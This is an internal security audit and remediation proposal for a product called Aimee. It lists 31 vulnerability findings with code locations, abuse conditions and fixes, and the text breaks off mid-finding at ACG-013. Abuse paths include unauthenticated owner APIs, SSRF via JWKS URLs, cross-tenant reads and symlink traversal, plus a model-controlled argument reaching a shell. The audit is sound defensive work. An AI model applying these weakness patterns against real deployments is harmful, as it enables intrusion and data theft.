# Proposal: Security, compliance, audibility, and governance assurance program

- **State:** pending; source remediation implemented and tested, with the explicitly listed
  process-isolation, deployment, and organizational residuals still open
- **Audit passes:** two independent passes over the same commit, merged into this single
  record. ACG-001–ACG-025 are first-pass findings; ACG-026–ACG-031 are second-pass findings.
  See [Audit passes and attribution](#audit-passes-and-attribution)
- **Audit baseline:** `origin/testing` at
  `6a1b61a99c9cac5273ccf6c26d2a6a185a6985bd` (2026-08-26)
- **Remediation branch:** `agent/security-compliance-audit-fixes`
- **Audit scope:** the tracked source tree, build and release automation, deployment artifacts,
  runtime trust boundaries, data stores, operator surfaces, and checked-in tests and evidence
- **Output type:** point-in-time source audit plus an implementation proposal; this is not a legal
  opinion, penetration-test certification, or third-party compliance attestation
- **Owner:** Product Security, with the boundary owners named by each finding

## Decision requested

Adopt one assurance program that closes verified control gaps, makes every security claim traceable
to executable evidence, and produces a release-level evidence bundle suitable for internal review
and external assurance work.

The repository contains substantial security mechanisms. The audit must determine whether those
mechanisms are complete, default-on where the documentation implies a guarantee, consistently
enforced across every ingress and mutation path, and supported by durable evidence. A control is not
counted as effective merely because a proposal, config field, test fixture, or dormant implementation
exists.

## Audit method and evidence rules

The review uses these control lenses:

- NIST Cybersecurity Framework 2.0 for govern, identify, protect, detect, respond, and recover;
- NIST Secure Software Development Framework for repository, build, dependency, release, and
  vulnerability-response practices;
- OWASP ASVS for web and service controls, plus OWASP guidance for LLM and agentic systems;
- SOC 2 and ISO/IEC 27001 control intent for access control, change management, logging,
  availability, incident response, supplier risk, and evidence retention;
- privacy principles of purpose limitation, data minimization, retention, deletion, export,
  subject scoping, and processor transparency.

The standards are used as a control taxonomy, not as a claim that Aimee or its operator is certified
or legally compliant. Applicability depends on deployment, customer promises, data categories,
jurisdiction, and the operator's organizational controls.

Each finding must contain:

1. a stable identifier, severity, affected boundary, and control objective;
2. source, configuration, deployment, test, or workflow evidence from the audited commit;
3. the exploit or failure condition and its plausible impact;
4. current compensating controls and the residual risk;
5. a concrete remediation owner, acceptance test, and rollout or migration constraint.

Documentation and earlier proposals are leads, not proof. A documented guarantee is verified against
the implementation and its default deployment. A test is evidence only when the audit can identify
what it asserts and whether a required workflow runs it.

## Severity model

| Severity | Meaning | Target disposition |
| --- | --- | --- |
| Critical | Direct compromise of a high-value trust boundary, credential custody, tenant isolation, release integrity, or tamper evidence under a realistic precondition | Block release or exposed deployment; fix immediately |
| High | Material confidentiality, integrity, availability, authorization, or accountability failure with practical prerequisites | Remediate before the next production promotion |
| Medium | Defense-in-depth, incomplete enforcement, weak defaults, evidence, recovery, or lifecycle control that can amplify another failure | Schedule with an owner and bounded milestone |
| Low | Limited-impact hardening, clarity, maintainability, or assurance gap | Track and close through routine maintenance |

Severity measures technical risk. Compliance significance is recorded separately because a low
exploitability issue can still block an audit when evidence or policy is absent.

## Scope inventory

The baseline contains 6,103 tracked files. The principal implementation languages are C, Go,
Python, shell, TypeScript, SQL, and YAML. The audit covers:

- native client, server, KB, gateway, event bus, tool, delegate, vault, audit, governance, workflow,
  memory, retrieval, and plugin/module code;
- Go control plane, webchat/runtime web, workflow engine, and service modules;
- browser applications and session handling;
- PostgreSQL and SQLite schemas, migrations, backup, restore, retention, and deletion paths;
- Docker, Compose, systemd, and managed/split deployment variants;
- GitHub Actions, release automation, dependency locks, vendored code, generated artifacts, and
  module ownership gates;
- public APIs, route descriptors, authentication, authorization, rate limits, TLS, remote writes,
  and cross-service identity propagation;
- audit/WORM capture, policy verdicts, checkpoints, witnesses, redaction, operator access, and
  evidence export;
- project governance, ownership, approvals, exceptions, proposal lifecycle, security policy,
  incident response, vulnerability intake, and compliance evidence.

Excluded from source-only verification are live cloud/IAM configuration, production secrets,
employee controls, contracts, customer data flows, and the behavior of deployed third-party
providers. These require a deployment and organizational audit before any certification claim.

## Audit limitations and reproducibility

- The registered Aimee index service was unavailable for both `index investigate` and the required
  `index hybrid` fallback. Direct repository inspection is therefore the source-discovery method.
- The audit branch was created directly from the current fetched `origin/testing`; the original
  feature checkout and its uncommitted files are excluded.
- Findings distinguish static evidence, executable test evidence, and live-deployment evidence.
  Source presence alone cannot establish operational effectiveness.
- Surfaces the second pass did not review at line level, and does not claim clean: the event-bus
  arena implementation; the Go workflow engine and control plane (`server-go`, ~29k lines) beyond
  dependency posture; the browser and webchat CSRF and session surface; the KB management token and
  JWKS verification path (partially covered by ACG-007); and the Windows and macOS platform
  backends. The first pass covered several of these; where neither pass reached a surface, it is
  named here rather than left implied.

<a id="audit-passes-and-attribution"></a>
## Audit passes and attribution

This audit was performed as **two independent passes over the same commit**, run concurrently and
without visibility into each other's findings until both sweeps had completed. They were kept
attributable while in progress and are merged here into one record and one ledger.

- **First pass — ACG-001 to ACG-025.** Entered through deployment and dependency surfaces: shipped
  Compose topologies, workflow pinning, Go module versions, DB1 bootstrap, route and capability
  inventory, tenant isolation, and the audit chain's own schema.
- **Second pass — ACG-026 to ACG-031.** Entered through in-process enforcement primitives: the
  shell-quoting helper, the path validator, the generated config-accessor layer, the CSPRNG, and
  the retention and erasure surface.

The two passes overlapped on four items and diverged on the rest. The divergence is informative
rather than accidental: neither entry point sees the other's findings. The second pass produced the
audit's **second Critical** (ACG-026), which the first pass did not reach; the first pass produced
the KB authentication finding (ACG-001) and the dependency and release-integrity findings, which
the second did not.

The practical conclusion for the assurance programme: a single audit lens over a codebase of this
size systematically misses whole classes of defect. Where the programme below commissions
independent testing, it should commission **distinct lenses**, not a repeat of the same one.

Four items were found by both passes. They are recorded once, under the first-pass ID, with the
second pass's evidence folded in:

| Overlapping item | Recorded as | Second-pass contribution |
| --- | --- | --- |
| WORM capture default-off | ACG-002 | Test-locked default, and the `aimee audit verify` false pass; see the addendum in ACG-002 |
| SBOM, signing, provenance | ACG-004 | No separate finding filed |
| Dependency scanning in CI | ACG-004 / ACG-005 | Only the sanitizer, SAST and secret-scanning half is filed separately, as ACG-027 |
| Published guarantees vs shipped behaviour | ACG-025 | The *understatement* direction; see the addendum in ACG-025 |

Two further pairs are distinct findings that share one root cause and must be remediated together
rather than separately — ACG-013 with ACG-028 (path authorization), and ACG-006 with ACG-030
(constant sentinel written on failure). Each pair is cross-referenced in both of its findings.

## Finding ledger

This table is updated as findings are verified. Candidate issues stay out of the severity totals.

| ID | Severity | Domain | Finding | Status |
| --- | --- | --- | --- | --- |
| ACG-001 | Critical | Authentication / deployment | Shipped KB topologies expose an authentication-off owner surface | source-remediated; remote-tested |
| ACG-002 | High | Audit / governance | Governed-action WORM capture is default-off, best-effort, and may be silently lost | source-remediated; fault-path tested |
| ACG-003 | High | Audit integrity | WORM hashes do not bind timestamps or later identity/tenant attribution columns | source-remediated; v2 migration tested |
| ACG-004 | High | Supply chain | Release workflows trust mutable actions and publish unattested artifacts | source-remediated; workflow checks pass |
| ACG-005 | High | Dependency security | `server-go` reaches a known infinite-loop vulnerability in `golang.org/x/text` | remediated; dependency tests pass |
| ACG-006 | Medium | Audit integrity | Audit-key failure emits a valid-looking all-zero argument-hash sentinel | source-remediated; failure injection passes |
| ACG-007 | Medium | Control-plane egress | Operator-editable JWKS URLs permit private-address and DNS-rebinding requests | source-remediated; negative tests pass |
| ACG-008 | Medium | Database hardening | Shipped DB1 uses a static password, plaintext transport, and the bootstrap superuser at runtime | source/deployment-remediated; rollout evidence pending |
| ACG-009 | Medium | Supply chain | Container builds fetch executable inputs without complete immutable verification | source-remediated; integrity check passes |
| ACG-010 | Low | Dependency security | The frontend development lock contains vulnerable `nanoid` 3.3.16 | remediated; lock audit passes |
| ACG-011 | High | Tenant isolation | Cross-project content and memory reads are fail-open until operator-gated scope controls are enabled | source-remediated; non-superuser remote matrix passes |
| ACG-012 | High | Audit confidentiality | Every authenticated bearer receives global dashboard and audit views without actor or tenant isolation | source-remediated; authorization tests pass |
| ACG-013 | High | Filesystem authorization | `skill.show` trusts caller-selected roots and follows symlinks, permitting cross-workspace server-side file reads | source-remediated; no-follow tests pass |
| ACG-014 | High | Agentic security | Autonomous document-triggered execution is default-on while the integrity gate protects only one learning ingress | source-remediated; ingress and kill-switch tests pass |
| ACG-015 | High | Audit completeness | Several live enforcement and privileged-action paths never reach the tamper-evident chain | source-remediated for enumerated paths; completeness rollout pending |
| ACG-016 | High | Artifact trust | Project skills and other executable agent artifacts are unsigned, unpinned, and loaded as authoritative instructions | source-remediated across enumerated executable artifacts; negative tests pass |
| ACG-017 | Medium | Accountability | Delegate and hook identity collapses to coarse or spoofable principals | source-remediated; session-scoped hook-token tests pass |
| ACG-018 | Medium | Egress governance | Modules can make direct outbound calls and can silently omit the required governance event | ordinary Go process modules source-remediated; core-plane convergence/deployment evidence remain |
| ACG-019 | Medium | Change governance | Sensitive-code ownership and independent approval are prose-only or incomplete in CODEOWNERS | source-remediated; live separation and signed evidence remain open |
| ACG-020 | Medium | Compliance readiness | Required organizational, privacy-lifecycle, and audit-evidence artifacts are absent from the source evidence set | source evidence added; organizational operation pending |
| ACG-021 | Medium | Build parity | Make and CMake products expose different audit/WORM capabilities | remediated; Make/CMake parity tested |
| ACG-022 | Medium | Availability | A hostile MCP SSE peer can drive unbounded buffering or an indefinitely blocked response drain | remediated; adversarial tests pass |
| ACG-023 | Medium | Gateway identity | Gateway pairing codes are predictable/non-unique and pairing state updates are not atomic across processes | remediated; concurrency tests pass |
| ACG-024 | Medium | Security testing | The checked-in nightly fuzz workflow is broken by a referenced but absent target source | remediated; canonical fuzz matrix builds |
| ACG-025 | Medium | Assurance claims | The published security model states guarantees that shipped defaults and reachable paths contradict | remediated with release-qualified claim registry |
| ACG-026 | Critical | Tool containment / injection | `shell_escape()` does not quote; ~20 unquoted call sites let a model-controlled MCP git path argument reach a shell on aimee-server, with forge credentials in scope | remediated; argv/quote/path tests pass |
| ACG-027 | High | Secure development | Binary hardening depends on toolchain defaults (no stack canaries, no fortified libc, partial RELRO only), and sanitizer, SAST and secret-scanning gates are absent | remediated; hardened binary checks pass |
| ACG-028 | Medium | Filesystem authorization | `guardrails_validate_file_path` is a sensitive-path deny-list, not workspace confinement, and ignores its own bounds parameter | remediated; bounded workspace validator tested |
| ACG-029 | Medium | Governance / policy resolution | Generated config accessors cannot distinguish "off" from "config authority unreachable"; security flags fail open | remediated; mechanical fail-open check passes |
| ACG-030 | Medium | Credential custody / accountability | CSPRNG failure fails open to a constant, colliding identifier on session, artifact, trigger and ingress paths | remediated; failure injection passes |
| ACG-031 | Medium | Data protection, retention, deletion | No data-subject erasure and no content retention control, despite the security model instructing operators to configure one | source-remediated; cross-store remote acceptance passes |

Original verified total: **2 critical, 11 high, 17 medium, and 1 low — 31 findings**. The
remediation disposition above does not silently erase the original severity. A finding is fully
closed only when its acceptance evidence and any required live/organizational evidence are present.

## Remediation implementation record

The remediation branch changes the product, build, deployment, tests, and evidence system rather
than merely changing this proposal's status. The principal implemented controls are:

- authenticated KB startup for network listeners, server/KB mTLS, operator-only global audit
  views, bounded and same-origin MCP SSE, pinned JWKS resolution, and CSPRNG-backed durable gateway
  pairing;
- default-on synchronous WORM action capture, startup key provisioning with fail-closed random
  failure, canonical v2 hashes binding time and full attribution, and schema parity across SQLite,
  PostgreSQL, and DB2;
- one bounded registered-workspace path validator, no-follow/hardlink-safe project-skill reads,
  signed Ed25519 skill approval manifests, fail-closed security configuration reads, and argv-only
  MCP Git path discovery with a mechanical shell-quoting check;
- separate PostgreSQL migration/runtime authorities, TLS/SCRAM bootstrap, Compose secrets and
  network separation, exact external-input verification, commit-pinned Actions, SBOM/provenance
  generation, release signing, and a hardened Make/CMake profile with executable checks for PIE,
  full RELRO, NX, canaries, fortified libc, and control-flow protection;
- repaired canonical fuzz targets, sanitizer/static/secret/dependency gates, upgraded vulnerable Go
  and npm dependencies, release-qualified machine-readable security claims, expanded CODEOWNERS and
  ownership policy, incident/data-governance documents, and generated assurance evidence.
- one fail-closed content-visibility boundary with legacy quarantine and runtime-role RLS evidence,
  centralized integrity ingress plus an autonomy kill switch, digest/signature checks for saved
  workflows, custom blocks, roundtable templates and MCP manifests, and authenticated session hook
  tokens;
- a two-phase, retryable subject-erasure transaction spanning DB1 and DB2, scheduled mutable-content
  retention, derived-data cleanup and exactly-once minimized WORM completion evidence; and
- a bus-attested egress transport module with caller/purpose/method/path policy, request-digest and
  DNS/IP binding, explicit byte/time limits, non-followed redirects, unary HTTP and MCP SSE frame
  transport, metadata-only durable evidence, and least-privilege request grants. A static planted-
  bypass gate rejects direct Go-module sockets, while a synchronized Linux seccomp filter denies
  IPv4/IPv6 socket creation in ordinary Go process modules and retains Unix-domain module-bus access.

The implementation deliberately does **not** turn source presence into an operating-effectiveness
claim. These residuals keep the proposal pending:

| Residual | Required closure evidence |
| --- | --- |
| ACG-018 remaining core-plane/protocol convergence | Forge and MCP module credentials now resolve only in egress under caller-scoped, short-lived handles. Inventory and migrate or formally constrain trusted C server/KB protocols and separately declared store/proxy owners, and retain production proof that the Linux process guard and non-dumpable credential owner are active. |
| ACG-019/020 operating controls | Export live branch/ruleset/environment evidence, assign accountable people, exercise incident/restore/access-review procedures, and retain signed cadence evidence. |

None of these residuals reopens the two original Critical sink conditions: ACG-001 and ACG-026 are
source-remediated and remotely exercised. The ACG-011 migration and negative matrix and the ACG-031
cross-store privacy lifecycle have now been exercised in disposable PostgreSQL deployments. A
production promotion still requires deployment-specific migration evidence; regulated assurance
still requires the ACG-019/020 organizational records and operating cadence.

### ACG-001 — Shipped KB topologies expose an authentication-off owner surface

- **Control objective:** no network caller receives KB read, mutation, configuration, credential
  enrollment, or governance authority without an authenticated, least-privilege identity.
- **Evidence:** `deploy/container/aimee.yaml` contains no `kb_api_bearer_token`; the container
  entrypoint seals a supplied `AIMEE_KB_API_BEARER_TOKEN` but does not mint one. In
  `src/kb/kb_main.c:2318-2321` an absent secret starts the listener with an empty bearer.
  `src/kb/http/kb_http.c:676-685` runs authentication only when that bearer is non-empty, and
  `src/kb/http/kb_http.c:810-825` deliberately treats the resulting zeroed scope as owner and opens
  console, account, and governance handlers. `src/kb/http/kb_http.c:827-895` consequently permits
  owner enrollment minting in that state. `compose.yaml:40-42` and `compose.server.yaml:58-60`
  publish this surface on host loopback; `deploy/compose/aimee.yaml:47-54` and
  `deploy/smoothnas/aimee.compose.yaml:57-60` publish it on all host interfaces. The server-to-KB
  link is plain `http://aimee-kb:8741` and carries no client identity.
- **Failure condition and impact:** a local unprivileged process, any compromised sibling on the
  Compose network, or a remote network peer in the all-interface profiles can read KB material,
  invoke owner-class configuration/governance handlers, and mint a connection credential. This is
  a default deployment condition, not an operator misconfiguration.
- **Compensating controls:** some tenancy mutations additionally require a verified actor; the
  principal compose files bind the host port to loopback. Those controls do not protect owner
  routes and do not isolate peers on the Compose network. The SmoothNAS and legacy deploy files do
  not have the loopback compensation.
- **Required change / owner:** Platform Security must make authentication non-optional whenever the
  listener is non-loopback, mint a scoped server credential through the disposable Vault bootstrap,
  remove host publication unless explicitly requested, and replace the service link with mTLS.
  Auth-off may exist only on a Unix socket or process-private loopback listener with owner routes
  mechanically disabled.
- **Acceptance evidence:** fresh-install tests for every shipped topology must prove anonymous GET,
  mutation, governance, and enrollment calls return 401/403 from both host and sibling-container
  origins; the enrolled server credential must fail owner and console-admin routes; packet capture
  must show TLS with client-certificate verification.

### ACG-002 — Governed-action WORM capture is default-off and lossy

- **Control objective:** every governed decision and resulting privileged action has complete,
  durable, tamper-evident capture, and loss changes health/readiness or enforcement posture.
- **Evidence:** `docs/gen/configuration.md:34` documents `audit_worm_enabled` as default off.
  `src/modules/guardrails/guardrails_action_audit.c:36-48` implements that default; lines 65-80
  return when disabled and discard `audit_worm_append`'s result. The file contract at lines 1-9
  explicitly accepts audit loss. The ordinary action row crosses a bounded, best-effort event bus
  at lines 125-131. `src/modules/audit/obs_bus.c` has a 4,096-item writer queue and drop accounting,
  but no backpressure into the action verdict.
- **Impact:** the product can allow or block actions while producing no durable governed-action
  evidence. An operator cannot prove completeness from surviving rows, and a healthy service does
  not distinguish a functioning ledger from silent loss.
- **Compensating controls:** default-on `audit.log`, bus drop metrics, and optional WORM dual-write
  provide partial detection. `audit.log` is not the tamper-evident authority and drop metrics do not
  reconstruct missing records.
- **Required change / owner:** Audit & Governance must adopt the existing
  `governance-attestable-enforcement.md` design: default-on WORM for governed actions, synchronous or
  transactionally outboxed decision capture before effect, explicit degraded readiness, monotonically
  checkable capture counters, and a tightly governed emergency override.
- **Acceptance evidence:** fault-inject full queues, unavailable storage, reload failure, disk full,
  and process crash at every decision/effect boundary; no effect may be reported complete without
  either its committed row or an explicit fail-closed/degraded result.

- **Second-pass addendum.** Two evidence items, neither changing the severity.
  `src/tests/test_db2_runtime_config_support.c:8` asserts `config_audit_worm_enabled() == 0` as the
  expected default, so default-off is intentional and *test-locked*, not incidental — the
  remediation must change a test, which is worth knowing before scheduling it. And the
  operator-facing consequence deserves its own acceptance test: an operator following the Operator
  checklist in `docs/SECURITY.md` runs `aimee audit verify`, receives a **pass on an empty chain**,
  and reasonably concludes the tamper-evidence guarantee holds. Until the default flips,
  `aimee audit verify` must exit non-zero with "chain disabled — nothing verified" rather than
  succeeding.

### ACG-003 — The WORM chain does not bind chronology or full attribution

- **Control objective:** verification detects alteration of every field presented as audit evidence,
  particularly time, actor, transport identity, tenant, and selected policy context.
- **Evidence:** `src/modules/audit/audit_worm_chain.c:24-48` hashes exactly eight fields plus the
  predecessor and excludes `ts`. The verifier query at `src/modules/audit/audit_worm.c:348-393`
  likewise omits it. DB2's independent producer documents and hashes the same eight fields at
  `src/modules/db2/c/schema.sql:7681-7727`. Five attribution fields were later added to
  `kb_audit_event` at `src/modules/db2/c/schema.sql:2833-2839` (`actor_issuer`, `actor_subject`,
  `transport_cn`, `team_id`, and `selected_default_from`) without being included in that canonical
  hash or the C/SQL verification path.
- **Failure condition and impact:** an attacker or administrator able to bypass append triggers,
  alter a restored database, or manipulate an export can rewrite event time and unbound attribution
  while chain verification remains green. Incident chronology, retention windows, tenant attribution,
  and non-repudiation evidence are therefore not cryptographically supported by the current result.
- **Compensating controls:** append triggers and database roles reduce ordinary online edits; signed
  checkpoints and witnesses bind the hashed head. Neither can protect fields outside the hash.
- **Required change / owner:** Audit & Cryptography must version the canonical record, include every
  evidence field and a trusted-ingest timestamp, migrate old rows as explicitly `v1-partial`, update
  all SQLite/Postgres producers and verifiers together, and ensure exports state the version and
  coverage. Do not silently reinterpret existing rows as full-field evidence.
- **Acceptance evidence:** mutation tests for each column, including timestamps and all identity
  fields, must fail verification; mixed-version migration/export tests must preserve old-chain
  validation while labeling its limitations.

### ACG-004 — Release workflows trust mutable actions and publish unattested artifacts

- **Control objective:** a reviewed source commit maps reproducibly to authenticated artifacts via a
  least-privilege, immutable build path.
- **Evidence:** repository workflow parsing found 70 `uses:` references pinned to mutable tags and
  only 10 pinned to commit SHAs (plus two local actions). Release workflows use tagged
  `actions/checkout@v4`, Docker actions, artifact actions, and
  `softprops/action-gh-release@v2`; release jobs hold `contents: write` or `packages: write`.
  `publish-images.yml:139`, `publish-testing.yml:120`, `publish-embedder.yml:139,162`, and
  `publish-llm.yml:144` set `provenance: false`. `release-thin-client.yml:166-195` attaches raw
  binaries without signatures or checksums. No release SBOM, SLSA provenance, cosign signature, or
  checked-in verification policy was found.
- **Impact:** compromise or retagging of a third-party action can execute with release authority;
  consumers cannot independently bind binaries/images to source and build inputs. Human environment
  approval does not constrain code that runs after approval.
- **Compensating controls:** release workflows are reusable-only, an environment gate is present,
  permissions are declared per workflow, and images are assembled by digest. Live branch/environment
  protection settings cannot be verified from source.
- **Required change / owner:** Release Engineering must pin every external action to a reviewed full
  SHA, split build from publication tokens, enable signed keyless provenance, produce SPDX or CycloneDX
  SBOMs, sign image indexes and binaries, publish checksums, and enforce verification before promotion.
- **Acceptance evidence:** CI must reject mutable `uses:`, writable build jobs, disabled provenance,
  unsigned assets, or missing SBOMs; a clean consumer must verify source SHA, workflow identity,
  digest/signature, and dependency inventory offline from the evidence bundle.

### ACG-005 — Reachable `golang.org/x/text` denial of service

- **Evidence:** `server-go/go.mod:25` selects `golang.org/x/text v0.29.0`. Govulncheck reports
  GO-2026-5970 / CVE-2026-56852 as reachable through `modules/postgres/sql.go:246` and pgx. Invalid
  UTF-8 can make `norm.Iter` loop forever; the fixed version is v0.39.0.
- **Impact:** crafted invalid input reaching the normalization path can consume a server execution
  context indefinitely. The exact remote reachability of malformed DSN/service-file input requires
  dynamic confirmation, so this is High on a reachable call graph rather than Critical.
- **Required change / owner:** Dependency Maintenance must upgrade x/text to at least v0.39.0,
  reconcile the pgx dependency, add govulncheck to required CI for all three Go modules, and add a
  regression using invalid UTF-8 at the nearest Aimee-controlled input boundary.

### ACG-006 — Audit hashing failure looks like a complete row

- **Evidence:** `src/modules/audit/audit_action.c:259-273` writes `v1-` plus 64 zeroes before trying
  to load the key and says callers must skip on failure. `guardrails_action_audit.c:114-131` ignores
  the return and publishes both ordinary and WORM rows with the sentinel. Startup provisioning is
  explicitly best-effort and its result ignored at `src/server/server_main.c:205` and
  `src/cmd_hooks.c:282`.
- **Impact:** key permission, filesystem, entropy, or corruption failures yield durable rows that
  visually satisfy the hash format but do not bind action arguments. There is no unambiguous health
  state or alert tied to those rows.
- **Required change / owner:** Audit & Runtime must fail required startup, or emit a distinct typed
  `hash_status=unavailable` record on an independently reliable channel and enter degraded readiness;
  never place a sentinel in the digest field. Tests must inject every key failure.

### ACG-007 — JWKS retrieval lacks complete SSRF and rebinding defense

- **Evidence:** OIDC configuration is console-admin editable (`api/openapi-v1.yaml:2699-2728`). The
  KB validator checks only the `https://` prefix and explicitly defers SSRF validation at
  `src/kb/http/kb_http_accounts.c:240-276`. `control-web/auth.go:67-83` enforces HTTPS, no redirect,
  timeout, and a body limit, but its own comment states that private-range denial and a DNS-rebind
  re-check remain future work.
- **Impact:** a console administrator, stolen console session, or CSRF/control-plane compromise can
  make control-web connect to HTTPS services on loopback, private, link-local, or newly rebound
  addresses. Response parsing limits data exfiltration, but requests can probe services and carry
  network-level side effects.
- **Required change / owner:** Identity Platform must parse with a strict URL policy, resolve all
  addresses, deny non-public ranges unless an explicit destination allowlist permits them, pin the
  validated addresses in the dialer, re-check each connection, and test IPv4/IPv6, encoded hosts,
  redirects, CNAMEs, and DNS rebinding. Private enterprise IdPs require explicit scoped exceptions.

### ACG-008 — DB1 ships with static superuser credentials and plaintext transport

- **Evidence:** `compose.server.yaml:93-104,147-153` and `deploy/compose/aimee.yaml:85-96,128-135`
  use `aimee/aimee`, a plain `postgres://` DSN, and the `POSTGRES_USER` bootstrap account. The stock
  image makes that account the initial database superuser. `server-go/modules/postgres/sql.go:224-286`
  uses the same connection for runtime and schema creation. No TLS mode or separate migration/runtime
  role is set in the shipped topology.
- **Impact:** any Compose-network peer knows the database credential; a compromised application runs
  with database-superuser authority and can disable integrity controls or access every DB1 schema.
  Traffic is unencrypted on the virtual network. The DB port is not host-published, which reduces but
  does not remove the boundary.
- **Required change / owner:** Database Platform must generate a per-install secret, use a one-shot
  migrator/owner, run the service as `NOSUPERUSER NOCREATEDB NOCREATEROLE` with exact grants, require
  TLS verification for TCP, and isolate the database network from unrelated siblings.

### ACG-009 — Container builds have unverified executable inputs

- **Evidence:** `Dockerfile.server:240-313` downloads Docker CLI, Compose, GitHub CLI, and ast-grep
  release archives without checking published digests or signatures. `release-thin-client.yml`
  downloads a SQLite amalgamation without a digest. The KB image installs broad Python ranges
  (`sentence-transformers>=3.3`, `transformers>=5.2`, `optimum[onnxruntime]>=1.23`) without a lock or
  hashes. Model custom-code repositories discovered through `auto_map` use their default branch,
  explicitly acknowledged in `Dockerfile` as a looser pin. Base images use tags rather than digests.
- **Impact:** rebuilds are not input-reproducible and a compromised upstream, mutable dependency, or
  tag can inject code into privileged runtime/release images.
- **Required change / owner:** Release Engineering must maintain a reviewed build-input manifest with
  digests/signatures, locked Python requirements with hashes, digest-pinned bases, and explicit model
  code revisions. An update bot may propose changes, but CI must verify the manifest before execution.

### ACG-010 — Vulnerable development-only Nano ID lock

- **Evidence:** `frontend/package-lock.json:2213-2226` locks `nanoid` 3.3.16 through PostCSS. `npm
  audit --package-lock-only` reports one High advisory; `npm audit --omit=dev` reports zero production
  vulnerabilities, so current runtime exposure is not established.
- **Required change / owner:** Frontend Maintenance must refresh the lock to Nano ID 3.3.18 or later
  through a compatible PostCSS resolution and retain both full and production-only audits in CI.

### ACG-011 — Cross-project content and memory reads fail open

- **Control objective:** an authenticated actor can read only content authorized by one exact,
  server-derived actor/project/workspace decision; missing or ambiguous scope denies.
- **Evidence:** the repository's live corrective proposal,
  `docs/proposals/pending/per-user-content-scope-visibility.md`, explicitly records that a non-member
  can still reach another project's content and that the cross-tenant read hole is not fully fixed.
  `src/modules/db2/c/schema.sql:3000-3015` says the document/file policies remain inert until an
  operator attributes rows and enables RLS; the policies are defined but not enabled at
  `schema.sql:3074-3085`. `src/modules/db2/c/db2_tenant.c:135-164,287-306` treats absent enforcement
  as a normal unscoped maintenance path. `src/modules/db2/c/memory_scope_query.c:128-134` allows a
  memory whenever no scope is active or `include_all` is true. `src/server/server_api.c:242-269` and
  `src/server/server_mcp.c:290-320` derive `include_all` directly from caller JSON
  (`"scope":"all"`) without a separate audit/migration capability.
- **Failure condition and impact:** an authenticated caller can omit context, request `scope=all`,
  or use a data family not yet consuming the same decision and receive material belonging to another
  project or user. The operator-gated RLS can protect selected document tables after a correct
  backfill, but it does not cover memory, code index, or workspace with one policy owner.
- **Compensating controls:** signed write grants and tenant-aware SQL exist; the CI P1 RLS job tests
  the enabled PostgreSQL policies. Those are write/enabled-state controls and do not make the shipped
  read default fail closed. The local unit run could not execute its PostgreSQL RLS gate because
  `AIMEE_TEST_PG_URL` was unset.
- **Required change / owner:** Identity & Data Authorization must implement the existing proposal's
  exact Go `ContentVisibilityDecision`, remove ordinary caller control of `include_all`, force RLS
  after an explicit backfill, and apply the same immutable decision to documents, file/code index,
  workspaces, retrieval, and memory. Legacy unattributed rows are quarantine, not global content.
- **Acceptance evidence:** a two-user/two-team/two-project matrix must negatively test get, list,
  search, recall, index lookup, workspace open/list, pagination, cache, maintenance, and every
  `scope=all` spelling before and after pool reuse and restart.
- **Remediation verification (2026-08-27):** the content decision now reaches ordinary document,
  vector, structured-child and maintenance paths; unattributed legacy projects move into a reserved
  no-member quarantine before FORCE RLS is enabled. `src/tests/test_content_scope_pg.c` runs pooled
  connections as the real `aimee_kb_runtime` role and passed remotely against PostgreSQL/pgvector,
  including two users on separate teams, caller-less denial, pool reuse, exact-project re-embedding,
  sibling relabel rejection and every covered child relation. That run also found and fixed an
  empty-team cast fault and missing exact-project maintenance visibility on the tenancy referents.

### ACG-012 — Read-only bearer access exposes global audit and dashboard data

- **Control objective:** operational and audit evidence is separately authorized and filtered to the
  actor/tenant, except for an explicit auditor role with recorded purpose and access.
- **Evidence:** `src/headers/server.h:155-166` places `CAP_DASHBOARD_READ` in `CAPS_READ_ONLY`, the
  capability assigned to an ordinary authenticated bearer. `src/server/server_auth.c:86-90` maps
  `dashboard.*`, `audit.verify`, and related reads to that capability.
  `src/server/server_state.c:2132-2182` reads the complete local action ledger without actor or
  tenant predicates; `server_state.c:2270-2397` returns global KB logs, delegations, traces, plans,
  agents, token audit, decisions, and WORM/file action rows. The pending
  `operator-audit-activity-residual.md` independently names actor/tenant isolation and authorization
  tests as undelivered.
- **Impact:** any enrolled read-only client can enumerate other users' operations, command evidence,
  project activity, agent/delegate state, cost/token summaries, decisions, and log detail. Those data
  can contain personal information, repository names, operational topology, or sensitive action
  context. Pagination makes full extraction straightforward.
- **Compensating controls:** a bearer is required on the server TCP listener, response size is
  bounded, and command previews intentionally omit arguments. Enrollment is not equivalent to
  organization-wide audit authority, and per-action secret scanning is absent.
- **Required change / owner:** Audit Platform and Identity must introduce separate
  `audit:self`, `audit:tenant`, and `audit:global` capabilities, bind filters server-side to verified
  identity, make global access operator/auditor-only, record all audit reads, and prevent aggregate
  panels from bypassing the same predicates.
- **Acceptance evidence:** cross-actor and cross-tenant negative tests must cover every dashboard,
  log, trace, plan, decision, token, capture, replay, export, pagination, and aggregate route.

### ACG-013 — `skill.show` permits cross-workspace server-side file reads

- **Control objective:** a read API may resolve only a validated artifact below the caller's
  authorized workspace, without traversal, alternate-root selection, or symlink escape.
- **Evidence:** `src/server/server_skill.c:18-27` returns a caller-supplied `cwd` verbatim.
  `handle_skill_show` at lines 114-135 passes it and `name` directly to the loader without calling
  `skill_name_is_valid` or a workspace authorization function. `src/modules/skills/skill.c:79-143`
  concatenates `<cwd>/.aimee/skills/<name>` and uses `stat`, which follows symlinks;
  `skill.c:172-203` then uses `fopen`, which follows them again. Support-file loading also uses
  path-string checks followed by ordinary `fopen`. The route is available as POST
  `/v1/skills/show` and `src/server/server_auth.c:74-76` grants it with `CAP_SESSION_READ`.
- **Failure condition and impact:** an authenticated read-only caller can choose another known
  workspace as `cwd`, use traversal in an unvalidated skill name, or target a project skill symlink.
  The server returns the bytes of any matching Markdown/support file readable by its OS user;
  a repository-controlled symlink removes the extension constraint. This contradicts the documented
  canonical-root/symlink guarantee and creates a practical cross-user and secret-file disclosure path.
- **Compensating controls:** mutation helpers validate skill names, support paths reject literal
  `..`, and the process OS account still bounds readable files. None applies the necessary root and
  no-follow invariant to this read handler.
- **Required change / owner:** Skills and Workspace Security must ignore caller roots in favor of the
  authenticated session's workspace handle, validate names on every operation, and resolve with
  directory FDs plus `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` or a portable no-follow walk.
  Support assets must resolve relative to the selected skill directory, not a string-derived path.
- **Acceptance evidence:** remote read-only tests must fail alternate roots, absolute paths, `..`,
